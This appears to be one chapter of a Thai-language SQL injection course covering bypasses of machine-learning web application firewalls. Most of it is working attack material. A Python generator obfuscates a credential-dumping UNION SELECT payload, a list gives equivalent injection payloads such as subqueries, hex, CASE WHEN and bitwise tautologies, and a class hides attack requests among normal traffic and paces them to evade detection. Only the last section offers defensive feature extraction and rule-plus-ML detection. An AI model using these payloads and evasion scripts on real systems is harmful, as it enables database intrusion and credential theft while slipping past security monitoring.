# Part 065: Machine Learning WAF Bypass

## ภาพรวม

เทคนิคการ bypass WAF ที่ใช้ Machine Learning (ML-based WAF)

**ขั้นตอนที่ 1046-1060**

---

## 1046. ML-Based WAF คืออะไร

```
ML WAF ใช้ model เป็น classifier:
- input: HTTP request (method, path, headers, body)
- output: benign / malicious (confidence score)

ตัวอย่าง: AWS WAF ML, Cloudflare WAF AI, Imperva ML

วิธี bypass ML WAF:
1. Adversarial examples - เพิ่ม noise เพื่อ fool model
2. Low confidence zone - payload ที่ model ไม่ confident
3. Feature mismatch - ใช้ context ที่ model ไม่ได้ train
4. Input fragmentation - แบ่ง payload ในหลาย requests
5. Semantic equivalence - ใช้คำสั่งที่แตกต่างแต่ความหมายเดิยวกัน
```

---

## 1047. Adversarial SQL Payloads

```python
# สร้าง adversarial SQL payloads
# วิธี: เพิ่ม benign-looking noise รอบๆ malicious core

import random
import string

class AdversarialSQLGenerator:
    
    BENIGN_NOISE = [
        # SQL ที่ดูเหมือนปกติ
        "name LIKE 'John%'",
        "status = 'active'",
        "created_at > '2024-01-01'",
        "category_id = 5",
        "ORDER BY id DESC",
    ]
    
    def inject_noise(self, payload: str) -> str:
        """Add benign-looking context around malicious payload"""
        noise = random.choice(self.BENIGN_NOISE)
        # แทรก noise ก่อน payload
        return f"{noise} -- benign context\n{payload}"
    
    def fragment_payload(self, payload: str, parts: int = 3) -> list:
        """Split payload across multiple requests (HTTP param pollution)"""
        chunk_size = len(payload) // parts
        fragments = []
        for i in range(parts):
            start = i * chunk_size
            end = start + chunk_size if i < parts-1 else len(payload)
            fragments.append(payload[start:end])
        return fragments
    
    def add_comment_noise(self, payload: str) -> str:
        """Insert random comments to break pattern recognition"""
        words = payload.split()
        result = []
        for word in words:
            result.append(word)
            if random.random() > 0.7:
                comment = ''.join(random.choices(string.ascii_lowercase, k=4))
                result.append(f'/*{comment}*/')
        return ' '.join(result)
    
    def lowercase_uppercase_mix(self, payload: str) -> str:
        """Mixed case to break keyword matching"""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )

# Usage:
gen = AdversarialSQLGenerator()
original = "' UNION SELECT 1,username,password FROM users-- -"
print("Noise:", gen.inject_noise(original))
print("Comments:", gen.add_comment_noise(original))
print("MixCase:", gen.lowercase_uppercase_mix(original))
```

---

## 1048. Semantic Equivalence Bypass

```sql
-- คำสั่งที่ความหมายเดียวกัน แต่ syntax ต่างกัน

-- Original: ' UNION SELECT version()--
-- Bypass 1: Subquery
' UNION (SELECT (SELECT version()))-- -

-- Bypass 2: HEX strings
' UNION SELECT 0x76657273696f6e()-- -  -- hex of 'version'

-- Bypass 3: Function aliases
-- MySQL: VERSION() = @@version
' UNION SELECT @@version-- -

-- Bypass 4: CASE WHEN
' AND CASE WHEN (1=1) THEN 1 ELSE 0 END=1-- -
-- vs normal: ' AND 1=1--

-- Bypass 5: NOT IN
' OR id NOT IN (99999)-- -  -- always true
-- vs normal: ' OR 1=1--

-- Bypass 6: BETWEEN with impossible range reversed
' OR 1 BETWEEN 0 AND 2-- -  -- 0 <= 1 <= 2 = true

-- Bypass 7: Bitwise operations
' OR 1&1-- -  -- 1 AND 1 = 1 (true)
' OR 1|0-- -  -- 1 OR 0 = 1 (true)
```

---

## 1049. Request Rate และ Timing Bypass

```python
import requests
import time
import random

class StealthMLBypass:
    """
    ส่ง requests ในลักษณะที่ไม่ให้ ML model confident
    """
    
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
    
    def blend_with_normal(self, attack_params: dict, normal_params: dict, ratio: int = 5):
        """
        แทรก attack request 1 ครั้ง ใน normal requests 5 ครั้ง
        เพื่อลด anomaly score
        """
        # ส่ง normal requests
        for _ in range(ratio):
            self.session.get(self.base_url, params=normal_params, timeout=5)
            time.sleep(random.uniform(0.5, 2.0))
        
        # ส่ง attack request
        response = self.session.get(self.base_url, params=attack_params, timeout=10)
        return response
    
    def slow_drip(self, payloads: list, delay_range: tuple = (3, 8)):
        """
        ส่ง payload ช้าๆ เพื่อหลีก rate-based ML detection
        """
        results = []
        for payload in payloads:
            r = self.session.get(self.base_url, params={'id': payload}, timeout=10)
            results.append({'payload': payload, 'status': r.status_code, 'len': len(r.text)})
            
            # Random delay ระหว่าง delay_range[0]-delay_range[1] วินาที
            time.sleep(random.uniform(*delay_range))
        
        return results
```

---

## 1050. ป้องกัน ML WAF Bypass

```python
# Defense: เพิ่มประสิทธิภาพ ML model

# 1. Training data diversity
# เพิ่ม adversarial examples ใน training set

# 2. Feature engineering
# ใช้ AST parsing แทน string matching
import sqlparse

def extract_sql_features(payload: str) -> dict:
    parsed = sqlparse.parse(payload)
    features = {
        'has_union': False,
        'has_select': False,
        'keyword_count': 0,
        'string_literal_count': 0,
        'comment_count': 0,
    }
    
    for stmt in parsed:
        for token in stmt.flatten():
            if token.ttype in (sqlparse.tokens.Keyword, sqlparse.tokens.Keyword.DML):
                features['keyword_count'] += 1
                if token.normalized == 'UNION':
                    features['has_union'] = True
                if token.normalized == 'SELECT':
                    features['has_select'] = True
            elif token.ttype in (sqlparse.tokens.String.Single,):
                features['string_literal_count'] += 1
            elif token.ttype in (sqlparse.tokens.Comment.Single, sqlparse.tokens.Comment.Multiline):
                features['comment_count'] += 1
    
    return features

# 3. Ensemble approach
# ใช้ ML + rules พร้อมกัน
def combined_detection(payload: str, ml_score: float, threshold: float = 0.6) -> bool:
    features = extract_sql_features(payload)
    
    # Rule-based check
    if features['has_union'] and features['has_select']:
        return True  # กรองเสมอ
    
    # ML score
    if ml_score > threshold:
        return True
    
    return False
```

---

## สรุป

ML WAF Bypass:
- **Adversarial payloads** - noise injection รอบ payload
- **Semantic equivalence** - ใช้คำสั่งที่แตกต่างแต่ความหมายเดียว
- **Rate/timing** - แทรก attack ใน normal traffic
- **Defense** - AST features + ensemble ML + rules

---

*Part 065 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
